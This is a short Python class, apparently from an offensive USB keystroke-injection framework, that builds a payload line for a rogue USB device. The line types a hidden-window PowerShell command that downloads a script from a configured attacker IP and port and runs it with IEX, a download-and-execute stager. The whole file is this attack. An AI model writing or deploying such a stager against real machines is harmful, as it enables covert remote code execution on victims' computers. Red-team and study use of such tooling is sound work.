from core.payloads.base import USBPayload
from core.config import Config


class Execute(USBPayload):
    def __init__(self, config: Config):
        self.config = config
        self.source = "basic-payload.txt"
        self.lines: dict = {
            "KEY1": f"STRING powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('http://{self.config.ip_address}:{self.config.server_port}/{self.config.out_file}')"
        }
